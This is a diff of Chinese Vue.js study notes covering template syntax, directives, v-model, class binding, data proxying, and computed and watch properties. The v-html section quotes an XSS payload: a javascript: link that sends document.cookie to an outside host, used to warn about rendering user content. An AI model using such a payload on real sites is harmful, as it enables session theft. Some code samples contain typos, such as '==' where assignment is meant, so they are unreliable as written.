@@ -338,7 +338,7 @@ https://vuejs.org/js/vue.min.js
  -->
 
 > Vue实例：el
-- 决定之后 Vue 实例会管理哪一个 DOM，值通常为css选择器字符串
+- 通过该配置项指定Vue管理的实例，值通常为css选择器字符串
 <!-- 
   new Vue({
     el:'#root',
@@ -351,7 +351,11 @@ https://vuejs.org/js/vue.min.js
 <!-- 在组件当中 data 必须是一个函数 -->
 
 - 作用: Vue 实例对应的数据对象
-- data中的一组组kv最终都会在vue实例上 
+- data中的一组组kv最终都会在vue实例上
+<!-- 
+  直接会在 this 上 也就是展开组件直接能看到data中的数据
+ -->
+
 - 只有配置在data中的数据 才会做数据代理 和 数据劫持
 - data中的数据发生变化 模板就会重新解析 用到data中的数据的地方就会被重新执行
 
@@ -387,7 +391,8 @@ https://vuejs.org/js/vue.min.js
  -->
 
 - 我们可以传入 template配置项 在里面写 模板的部分 vue在解析的时候会解析template中传入的模板 template的值是一个字符串
-- 注意：
+
+**注意：**
 - 1. 我们要使用模板字符串的形式
 - 2. 多个结构的时候外层要套一个div
 - 3. 使用template配置项的时候 vue在解析模板 挂载模板的时候 div#root会被template中内容完全替换 挂载到页面上的 仅是以<div>包裹器来的元素</div>
@@ -458,6 +463,7 @@ https://vuejs.org/js/vue.min.js
 ### 模板语法
 - 插值的相关操作都是把变量放入文本中显示 
 - 所有写表达式的地方 vm 身上的所有东西都可以写
+
 - 模板中的{{ }}中可以直接使用vm身上的属性和方法不用加this，同时模板中出现的属性和方法也只会去vm中查找 按着原型链
 <!-- 
   {{alert}}   就会报错vm身上没有alert方法
@@ -466,9 +472,18 @@ https://vuejs.org/js/vue.min.js
   data: {
     window: window
   }
-
   {{winodw.alert}}
+
+
+  <li>{{console.log(count)}}</li>   // 报错
+  
+  // 解决办法
+  data() {
+    return { window: window }
+  },
+  <li>{{winodw.console.log(count)}}</li>
  -->
+
 
 > 插值语法 {{ }}
 - 花括号中可以写js表达式 可以
@@ -517,6 +532,14 @@ https://vuejs.org/js/vue.min.js
   后续修改message里面的值 页面中显示的还是第一次的值
  -->
 
+- 工作中的应用场景
+- 有的时候 只想让这个功能实现一次 我们就使用了once 但是如果发生了网络错误之类的现象 用户点击了一次之后不能再次点击了 体验不好 这是后我们就搭配上了 try catch
+<!-- 
+  try {
+
+  } catch() { 在这里再次的绑定了once事件 }
+ -->
+
 
 > v-html
 - 它和v-text很想 唯一的区别就是 当它对应的值中含有标签的时候 v-html会对标签进行解析
@@ -556,6 +579,7 @@ https://vuejs.org/js/vue.min.js
   那什么场景下会被坏人利用这点呢
   比如 百度贴吧 我们用户可以发送留言 发送的留言都会保存在数据库中 然后程序员拿到数据后通过遍历 动态的渲染到页面结构里
 
+
   假如 有坏人 以下面的方式 留言
   <a 
   href=javascript:location.href="http://www.baidu.com?document.cookie"
@@ -576,7 +600,6 @@ https://vuejs.org/js/vue.min.js
 
 > v-text 
 - 向其所在的标签插入文本 插入内部再标签属性中完成 标签体内容为空
-
 - 如果 v-text对应的 值里有标签体类型的文本 它不会解析成标签 只是当字符串来解析
 <!-- 
   <h2 v-text='message'></h2>    // 结果：<div>hello</div>
@@ -645,7 +668,6 @@ https://vuejs.org/js/vue.min.js
 - js基础的时候我们就了解过js阻塞的概念
 <!-- 
   js    这里我要是加载一个js文件 要花费 5s 的时间
-
   html  这里就会等待5s后才会渲染出结果
  -->
 - 上面的这种情况下页面就会出现短暂的空白时间
@@ -661,7 +683,6 @@ https://vuejs.org/js/vue.min.js
 
 
 - 为了解决这个问题 我们可以在标签内部加上v-cloak这个属性
-
 <!-- 
   CSS部分:
     [v-cloak] {
@@ -696,9 +717,16 @@ https://vuejs.org/js/vue.min.js
 
 > 使用 Vue实例中的 配置项 directives : { }
 - 配置自定义指令 v-big
-- 在 directives 里面 直接写 big 在使用的时候再加 v-
+- 在 directives 里面配置的时候 直接写 big 
+- 在模版中使用的时候再加 v-
+<!-- 
+  directives: { big: { } },
+  directives: { big() { } }
+ -->
 
-- big的配置有两种书写方式 对象 和 函数 对象的优势在于可以处理细节上的东西
+- big的配置有两种书写方式 对象 和 函数 
+- 对象的优势在于可以处理细节上的东西
+
 - 所谓的自定义指令就是一个函数 由vue帮我们调用
 <!-- 
   <h3>放大10倍后的值是：<span v-big='number'></span></h3>
@@ -723,6 +751,16 @@ https://vuejs.org/js/vue.min.js
   }
  -->
 
+
+> 效果:
+- 在标签属性内部使用 v-big 传入的数据 会经过v-big处理后 展示到 标签体中
+
+
+> 注意:
+- 自定义属性传递进来的数据 必须是在组件身上定义过的 比如必须在data身上配置过
+- 因为它也要保证自定义属性 数据的响应式
+
+
 > 函数式的自定义指令
 - <span v-big='number'></span>
 - 函数式 自定义指令 中的参数
@@ -734,7 +772,7 @@ https://vuejs.org/js/vue.min.js
   binding： v-big 所绑定的标签对象 内部有很多的属性
 
   binding.value：
-           v-big 所绑定的data中的变量对应的值 可以通过binding.value拿到
+           就是标签属性中在使用 v-big 时传递进来的数据
   <!-- 
     binding.value == v-big='number'中的number == 50
 
@@ -758,6 +796,7 @@ https://vuejs.org/js/vue.min.js
   }
  -->
 
+
 > 自定义指令 函数式的调用时机
 - 也就是上面 big函数 什么时候会被调用
 - 1. 指令与元素成功绑定的时候 初始的时候
@@ -769,6 +808,13 @@ https://vuejs.org/js/vue.min.js
 
 > 对象式的自定义指令
 - <span v-fbind='number'></span>
+
+- 对象式的方式具有像生命周期式的性质 在下面的3种情况下会被触发
+- 1. 指令和元素成功绑定
+- 2. 已绑定指令的元素被 挂载 到页面
+- 3. 已绑定指令的元素 模版被重新解析
+
+- 一般 1 3 的逻辑是一样的 2的时候有点像 mounted
 
 - 我们先把函数准备好 vue会在对应的实际调用对应的函数
 - 下面的函数都能收到 element 和 binding 参数
@@ -829,19 +875,27 @@ directives: {
       }
     }
   }
+
+  像不像在一个自定义指令中写了3个生命周期函数
  -->
 
 
 > 自定义指令的坑
-- 自定义指令的名字 不要使用驼峰命名法 多个单词之间使用-来连接
+- 1. 自定义指令的名字 不要使用驼峰命名法 多个单词之间使用-来连接
 - 同时 变量名里面如果使用了 - 我们就要使用引号将它括起来
 <!-- 
   v-big-number
   'big-number'() { ... }
  -->
 
-- 自定义指令的函数中的this也就是directives里面配置的函数中的this都是window
-- 我们在directives配置的指令都属于局部指令其它的地方用不了
+- 2. 自定义指令的函数中的this(也就是directives里面配置的函数中的this)都是window
+<!-- 
+  我打印了一下 
+  函数式的自定义指令中的this是undefined
+  对象式的自定义指令中的this式
+ -->
+
+- 3. 我们在directives配置的指令都属于局部指令其它的地方用不了
 
 
 > 全局配置 自定义指令
@@ -888,7 +942,7 @@ directives: {
 
 
 > v-model:表单类属性名
-- v-model只能应用在表单类元素上(输入类元素)上
+- v-model只能应用在表单类元素上(输入类元素)上 一般都会绑定value
 <!-- 
   <input type="text" v-model:value='title'>
 
@@ -907,8 +961,9 @@ directives: {
   比如注册页面 登录页面都需要获得用户的登录信息
  -->
 
-- 语法:
+> 语法:
 - v-model='data中的变量'
+- 将用户输入的内容双向绑定到该变量中
 
 - 在Vue中使用 v-model 指令来实现表单元素 和 数据的双向绑定
 <!-- 
@@ -940,7 +995,11 @@ directives: {
 
   等同于
 
-  <input type="text" :value='message' v-on:input='message == $event.target.value'>
+  <input 
+    type="text" 
+    :value='message' 
+    v-on:input='message == $event.target.value'
+  >
  -->
 
 > 具体操作:
@@ -970,6 +1029,7 @@ directives: {
 
 **注意：**
 - 1. 不要使用v-model绑定props属性 因为props属性是只读的
+
 - 2. vue只能浅层次的监视属性改变没有 不能深度监视 当props是一个对象的时候 我们只用v-model绑定props对象里面的一个值 vue是发现不了 但日后可能会出现种种的问题
 <!--
   在中川的项目就会发生这样的现象
@@ -1194,6 +1254,11 @@ directives: {
   <input type="text" v-model.trim='message'>
  -->
 
+
+> 要点:
+- 1. 修饰符.lazy的使用
+- 2. v-model绑定的结果都是字符串
+
 --------------------------
 
 ### 动态绑定属性    v-bind
@@ -1201,8 +1266,9 @@ directives: {
 
 - 前面我们学习的指令主要作用是将值插入到我们模板的内容中, 但是除了内容需要动态决定外, 某些属性我们也希望动态来绑定
 
-> v-bind:‘表达式’
-> :‘表达式’
+
+> v-bind:'属性' = "表达式"
+> :'属性' = "表达式"
 - 当我们加上v-bind:后面引号中的内容就当做js表达式去执行了
 - 该变量就会去data中去找
 <!-- 
@@ -1251,6 +1317,7 @@ directives: {
 > v-bind 动态绑定 class属性   -- 字符串写法
 > <h2 class='title' :class='mood'></h2>
 - 当动态添加class 和 普通class混合使用的时候 vue的部分不会覆盖掉普通的class部分
+
 - 适用于：
 - 样式的类名不确定 适用于动态指定
 <!-- 
@@ -1277,6 +1344,7 @@ directives: {
 > <h2 class='title' :class='classArr'></h2>
 - 适用于
 - 样式的类名不确定有多少， 名字也不确定的时候我们可以用数组的方式 获取样式的类名是请求回来的数据
+
 - 因为我们将样式的类名维护在一个数组中 数组可以定义在data中，这样我们删除数组中的元素就相当于删除一个类名 push一个元素就相当于添加一个类名 完全是用操作数组的方式控制类名
 <!-- 
   <h2 class='title' :class='classArr'></h2>
@@ -1296,6 +1364,8 @@ directives: {
 > <h2 v-bind:class='classObj'>
 - 适用于：
 - 要绑定的样式 个数确定 名字也确定 要动态的决定用不用
+- 对象的写法适用于 决定改样式显示与否
+
 - 将样式名：boolean组成一个对象 根据true 和 false 来确定是否应用该样式 我们通过布尔值来控制类名的添加与否 true:添加 false:不添加
 <!-- 
   <h2 :class='classObj'></h2>
@@ -1320,6 +1390,8 @@ directives: {
 
 
 > 案例: 点击按钮后改变文字颜色 再次点击复原
+- 单独的使用条件控制一个class是否显示
+
 <!-- 
     <div id='app'>
       <h2 v-bind:class='active:isActive'>{{message}}</h2>
@@ -1385,13 +1457,13 @@ directives: {
     <li :class='{active: 0 === currentIndex}'>    // true 所以添加 
     <li :class='{active: 1 === 0}'>
     <li :class='{active: 2 === 0}'>
-
  -->
 
 --------------------------
 
 ### v-bind绑定style
-- 我们能发现style指定内联样式的时候 style 也是kv成对出现de
+- 我们能发现style指定内联样式的时候 style 也是kv成对出现的
+- 同时 引号中的部分是表达式 如果当中出现了变量就是去组件实例身上找
 <!-- 
   :style:'{fontSize: fsize + "px"}'
  -->
@@ -1412,6 +1484,7 @@ directives: {
         fontSize: '40px'
       }}}
  -->
+
 
 > 动态绑定属性的原因:
 <!-- 
@@ -1446,15 +1519,15 @@ directives: {
 --------------------------
 
 ### Vue中的数据代理
-- 我们在vue中定义的数据都会放在data中，该数据都是通过Object.defineproperty方法添加上去的，添加上的数据都会vue对象上
+- 我们在vue中定义的数据都会放在data中，该数据都是通过Object.defineproperty方法添加上去的，添加上的数据都会在vue对象上
 
 - 当我们读取data中的数据的时候 该数据会触发getter，getter从哪获取到数据显示（_data）
 - 当我们设置data中的数据的时候 该数据会触发setter，修改getter读至的数据（_data）
 
-> 回顾 Object.defineproperty 方法
+> 回顾 Object.defineProperty 方法
 - 该方法在vue底层很多地方都被使用 数据代理 数据劫持 计算属性等
 
-> Object.defineproperty(指定对象, '属性名', {配置参数})
+> Object.defineProperty(指定对象, '属性名', {配置参数})
 - 使用该方法给一个对象添加属性，并对该属性进行限制 / 更改
 - 使用该方法添加的属性 默认是不能被枚举 不能被删除 不能被修改的
 
@@ -1465,19 +1538,20 @@ directives: {
 
   - 配置对象：基本配置
   - value:        属性值
-  - enumerable:   true / 默认值：false
-  - writable:     true / 默认值：false
-  - configurable: true / 默认值：false
+  - enumerable:   true / 默认值：false    枚举
+  - writable:     true / 默认值：false    重写
+  - configurable: true / 默认值：false    删除
 
 
   - 配置对象：高级配置
   - enumerable:   true / 默认值：false
   - configurable: true / 默认值：false
+
   - get:
     该方法会在 设置的属性 被读取的时候调用 该函数必须有返回值 返回值为该属性的属性值
-
   - set:
     该方法会在 设置的属性 被修改的时候调用 该函数会接收到参数 参数为被修改后的值
+
 <!-- 
   对 get 和 set 的理解 
   get： 我们给一个对象使用defineproperty方法添加了属性名 但是值去哪取？ 靠get
@@ -1519,6 +1593,53 @@ directives: {
   上面的person通过这个方法确实有age属性但是你现用我现取 想取去靠get 相当于去哪取 想改靠set 改成啥 还可以影响那个根源的值
  -->
 
+<!-- 
+  let person = {
+      name: "sam",
+      sex: "男"
+  }
+
+  // 定义监视变量的源
+  let watchNum = 0
+  
+  // 定义一个受监视的变量
+  Object.defineProperty(person, "age", {
+      get() {
+          return watchNum
+      },
+
+      set(val) {
+          watchNum = val
+      }
+  })
+ -->
+
+- 简单的使用原声js的方式实现了一下 计算属性
+- 当我们读取了或者修改了 obj.url 的时候 界面更新
+<!-- 
+  let urlSource = "www.baidu.com"
+  let obj = {}
+
+  Object.defineProperty(obj, "url", {
+      get() {
+          return urlSource
+      },
+
+
+      // 主要是在setter中写更新页面的逻辑
+      set(val) {
+          urlSource = val
+          $("#root").innerHTML = obj.url
+      }
+  })
+
+  $("#root").innerHTML = obj.url
+
+  function $(el) {
+      return document.querySelector(el)
+  }
+ -->
+
 
 > 数据代理
 - 通过一个对象 代理对另一个对象中属性的操作 （读写）就叫做数据代理
@@ -1526,14 +1647,15 @@ directives: {
 <!-- 
   比如 有一个obj 它有一个属性x 假如我要访问x那就是obj.x 改的话就是obj.x赋值就可以了
   
-  还有一个对象 obj2 我想让obj2 也能访问到x 也希望obj2 也能修改x
-  通过obj2代理对另一个对象obj中的属性去操作 这就是数据代理
+  还有一个对象 proxyObj 我想让proxyObj 也能访问到x 也希望proxyObj也能修改x
+  通过proxyObj代理对另一个对象obj中的属性去操作 这就是数据代理
 
 
   let obj = {x: 100}
-  let obj2 = {y: 200}
+  let proxyObj = {y: 200}
 
-  Object.defineProperty(obj2,  'x', {
+  // 通过这个方法在代理对象中添加要访问obj中的属性
+  Object.defineProperty(proxyObj,  'x', {
     get() {
       return obj.x
     },
@@ -1613,19 +1735,17 @@ directives: {
 - 所谓的计算属性 就是拿着已有的属性 去加工去计算然后得到一个全新的属性 
 
 - 计算属性书写在 computed 配置项中 它的类型是一个对象
+
 - 定义：
-- 要用的属性不存在 要通过已有的属性计算得来
-<!-- 
-  不在data配置项中的属性 不会被计算
- -->
+- data中不能定义计算属性 可以利用data已有的属性计算出新的结果
 
 - 原理：
 - 底层借助了Object.defineproperty方法提供的getter 和 setter
 
 - 优势：
-- 与methods相比 内部有缓存机制 可以服用效率更高 调试方便
+- 与methods相比 内部有缓存机制 复用效率更高 调试方便
 
-- 备注：
+- 注意：
 - 计算属性最终会在vm身上 直接读取使用即可
 - 如果计算属性要被修改 那必须要写set函数去响应修改 且set中要引起计算时依赖的数据发生改变
 <!-- 
@@ -1649,9 +1769,18 @@ directives: {
 
 
 > 计算属性的详解
+> 计算属性的对象写法
 - computed中 需要传递属性名 和 属性值， 属性值是一个对象
 - 对象有有两个方法 get set
 - get 和 set中的this就是vm
+<!-- 
+  computed: {
+    attr: {
+      get,
+      set
+    }
+  }
+ -->
 <!-- 
   computed:{
     fullName: {
@@ -1683,8 +1812,6 @@ directives: {
 - 如果我们的数据就是读取给别人用的话 set就可以不用写了 当我们的fullName以后会被修改的话 我们就要写set
 - 当fullName被修改的时候该函数会被调用
 
-
-
 - 在computed中定义属性(函数名) 跟data中定义的属性使用的方式都是一样的 使用的时候都是
 <!-- 
     app.books
@@ -1692,7 +1819,7 @@ directives: {
  -->
 
 
-> 计算属性的简写
+> 计算属性的函数写法
 - 更多的情况是 计算属性是不需要修改的 更多的是计算出来在页面上做呈现
 - 这时候就不需要set方法 这时候我们就可以简写计算属性 将属性名写成一个函数 函数体的内容就是计算属性的属性值
 <!-- 
@@ -1762,6 +1889,14 @@ directives: {
         }
       }
 
+
+      // 整理一下的写法
+      total() {
+        return this.books.reduce((pre, item) => {
+          return pre += item.price
+        }, 0)
+      }
+
     })
  -->
 
@@ -1775,7 +1910,7 @@ directives: {
 - 下面我们使用的是计算属性完成的逻辑 逻辑很简单 通过计算属性决定展示在页面上的值是什么 然后通过点击按钮改变计算属性中依赖的变量的值
 <!-- 
   <div @click='showWeather'>
-    今天天气很，{{info}}  
+    今天天气很， {{info}}  
   </div>
 
   new Vue({
@@ -1807,8 +1942,11 @@ directives: {
 
 > 监视属性
 - 监视属性的变化 在配置项中写监视谁 监视哪个属性
-- 不仅可以写data中的属性 计算属性也可以监视
-- 要监视的属性前面不用使用this 但是 handler 里面要想获取data中的变量要写this
+- 不仅可以监视data中的属性 计算属性也可以监视
+
+- 注意：
+- 在watch里面配置监视属性的时候，要监视的属性前面不用使用this 
+- 但是在监视属性内部的配置函数 handler 里面要想获取data中的变量要写this
 
 - 配置项：
 - watch: { 
@@ -1998,7 +2136,7 @@ directives: {
 
 --------------------------
 
-### 事件监听 / 处理
+### 事件的监听 / 处理
 - 在前端开发中, 我们需要经常和用户交互, 这个时候 我们就必须监听用户发生的事件, 比如点击 拖拽 键盘事件等等
 
 - 回调的事件必须填写在vue实例里的methods属性里面
@@ -2010,7 +2148,7 @@ directives: {
 > v-on:事件名=’事件处理函数‘   指令
 - 作用: 绑定事件监听器
 - 缩写: @+事件名   
-<!-- v-on:click  == @click -->
+<!-- v-on:click  ==  @click -->
 - 预期: function object
 - 参数: event
 <!-- 
@@ -2166,7 +2304,7 @@ directives: {
  -->
 
 
-> 给组件绑定事件            
+> 给组件绑定事件    @click.native
 - .native
 - 在我们需要监听一个组件的原生事件时, 必须给对应的事件加上.native修饰符 才能监听
 <!-- 
@@ -2616,6 +2754,51 @@ directives: {
   }
  -->
 
+<!-- 
+  <template>
+    <div id="app">
+      <ul>
+        <li><input type="text" v-model="msg" /></li>
+
+        <li 
+          v-for="item of newPersons" 
+          :key="item.id"
+        >
+          {{item.name}} -- {{item.age}}
+        </li>
+      </ul>
+    </div>
+  </template>
+
+  <script>
+
+  export default {
+    name: 'App',
+    data() {
+      return {
+        persons: [
+          {id: '001', name: '马冬梅', age: 18},
+          {id: '002', name: '周冬雨', age: 17},
+          {id: '003', name: '周杰伦', age: 4},
+          {id: '004', name: '温兆伦', age: 33},
+        ],
+        msg: "",
+        newPersons: []
+      }
+    },
+    watch: {
+      msg: {
+        immediate: true,
+        handler(n) {
+          this.newPersons = this.persons.filter(item => {
+            return item.name.match(n) != null
+          })
+        }
+      }
+    }
+  }
+  </script>
+ -->
 
 > 计算属性的写法
 - 计算属性中依赖了info 它会在两个时间点触发 一个是一上来 一个是依赖的info发生了变化它会重新计算 也就是说 info 一旦发生改变 整个计算属性都会跟着变
@@ -2887,7 +3070,7 @@ directives: {
  -->
 
 
-- 老师带咱么写的逻辑
+- 老师带咱写的逻辑
 - 首先定义了一个构造函数 在new 实例的时候传入 data对象
 - 然后构造函数中接到data对象 开始遍历属性名 使用Object.defineProperty方法将属性名添加到obs实例对象上，然后设置了getter setter
 
@@ -2927,7 +3110,6 @@ directives: {
  -->
 
 - 以上就是就是vue监测对象数据的原理
-
 
 --------------------------
 
@@ -17463,7 +17645,7 @@ export default {
  -->
 
 
-> 关闭语法检查
+> eslint 关闭语法检查
 - 创建 vue.config.js 文件
 <!-- 
   module.exports = {
